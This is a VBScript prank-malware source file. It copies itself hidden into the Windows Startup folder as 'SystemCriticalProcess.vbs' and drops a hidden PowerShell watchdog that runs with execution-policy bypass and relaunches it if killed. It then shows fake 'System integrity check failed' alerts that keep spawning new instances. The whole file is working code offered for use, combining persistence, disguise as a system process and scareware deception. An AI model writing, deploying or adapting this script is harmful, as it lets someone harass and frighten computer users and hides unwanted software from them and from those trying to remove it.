' Annoying VBScript with PowerShell Monitor
' Reverts to spawning 3, includes delay/beep.
' Adds a hidden PowerShell monitor to relaunch the script if killed.
' Warning: More persistent. Requires killing both wscript.exe and powershell.exe processes.

Option Explicit ' Enforce variable declaration

Dim objShell, fso, objArgs, startupFolderPath, vbsPath, ps1Path, quotedVbsPath
Dim count, response, fileAttr, psScriptContent, objTextFile

Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set objArgs = WScript.Arguments

' --- Configuration ---
Const VBS_SCRIPT_NAME = "SystemCriticalProcess.vbs"
Const PS1_SCRIPT_NAME = "SystemMonitorHost.ps1"
Const CHECK_INTERVAL_SECONDS = 10 ' How often the monitor checks (in seconds)

' --- Persistence Setup ---
' Get the Startup folder path
startupFolderPath = objShell.SpecialFolders("Startup")

' Define the full paths for the scripts in the Startup folder
vbsPath = fso.BuildPath(startupFolderPath, VBS_SCRIPT_NAME)
ps1Path = fso.BuildPath(startupFolderPath, PS1_SCRIPT_NAME)
quotedVbsPath = """" & vbsPath & """" ' VBS path enclosed in quotes

' Check if the script is currently running from the designated Startup path
If LCase(WScript.ScriptFullName) <> LCase(vbsPath) Then
    ' --- First Run Logic (Not running from Startup) ---
    On Error Resume Next ' Ignore errors temporarily

    ' 1. Copy VBScript to Startup
    fso.CopyFile WScript.ScriptFullName, vbsPath, True
    If fso.FileExists(vbsPath) Then
        Set fileAttr = fso.GetFile(vbsPath)
        If Not (fileAttr.Attributes And 2) Then fileAttr.Attributes = fileAttr.Attributes + 2 ' Add Hidden
    End If

    ' 2. Create PowerShell Monitor Script (.ps1) in Startup
    psScriptContent = "$vbsPath = """ & vbsPath & """" & vbCrLf & _
                      "$vbsScriptName = """ & VBS_SCRIPT_NAME & """" & vbCrLf & _
                      "$checkInterval = " & CHECK_INTERVAL_SECONDS & vbCrLf & _
                      vbCrLf & _
                      "while ($true) {" & vbCrLf & _
                      "    Start-Sleep -Seconds $checkInterval" & vbCrLf & _
                      "    " & vbCrLf & _
                      "    # Check if any wscript.exe process is running the target VBS" & vbCrLf & _
                      "    $runningProcesses = Get-CimInstance Win32_Process -Filter ""Name = 'wscript.exe' AND CommandLine LIKE '%"" + $vbsScriptName + ""%""""" & vbCrLf & _
                      "    " & vbCrLf & _
                      "    if ($null -eq $runningProcesses) {" & vbCrLf & _
                      "        # If no processes found, relaunch the VBS script hidden" & vbCrLf & _
                      "        try {" & vbCrLf & _
                      "            Start-Process wscript.exe -ArgumentList ""//B `"""" + $vbsPath + ""``"""" -WindowStyle Hidden -ErrorAction Stop" & vbCrLf & _
                      "        } catch {" & vbCrLf & _
                      "            # Optional: Log error if needed, e.g., Write-Host $_.Exception.Message" & vbCrLf & _
                      "        }" & vbCrLf & _
                      "    }" & vbCrLf & _
                      "}"

    Set objTextFile = fso.CreateTextFile(ps1Path, True) ' True = Overwrite
    objTextFile.Write psScriptContent
    objTextFile.Close
    Set objTextFile = Nothing

    ' Try to hide the PS1 file as well
    If fso.FileExists(ps1Path) Then
        Set fileAttr = fso.GetFile(ps1Path)
        If Not (fileAttr.Attributes And 2) Then fileAttr.Attributes = fileAttr.Attributes + 2 ' Add Hidden
    End If

    ' 3. Run the VBS copy from Startup (hidden)
    objShell.Run "wscript.exe //B " & quotedVbsPath, 0, False ' //B runs script without logo

    ' 4. Run the PowerShell Monitor (hidden)
    ' Use -ExecutionPolicy Bypass in case policy restricts script execution
    objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1Path & """", 0, False

    On Error GoTo 0 ' Re-enable error reporting
    WScript.Quit ' Exit this initial instance
End If

' --- Annoyance Logic (Running from Startup) ---

' Determine the current count from command line arguments, default to 1
If objArgs.Count > 0 And IsNumeric(objArgs(0)) Then
    count = Abs(CInt(objArgs(0)))
Else
    count = 1
End If

' Add a small random delay (100 to 600 milliseconds)
Randomize
WScript.Sleep(Int((500 * Rnd) + 100))

' Play a system beep sound (synchronously)
objShell.Run "rundll32 user32.dll,MessageBeep", 0, True

' Display the annoying message box
response = MsgBox("System integrity check failed! Instance: " & count & vbCrLf & "Scan code: #" & Rnd(), vbCritical + vbOKOnly, "!! SYSTEM ALERT !!")

' If user clicks OK, spawn THREE new instances
If response = vbOK Then
    objShell.Run "wscript.exe //B " & quotedVbsPath & " " & (count + 1), 0, False
    '    objShell.Run "wscript.exe //B " & quotedVbsPath & " " & (count + 2), 0, False
    '    objShell.Run "wscript.exe //B " & quotedVbsPath & " " & (count + 3), 0, False
End If

' --- End of Script ---
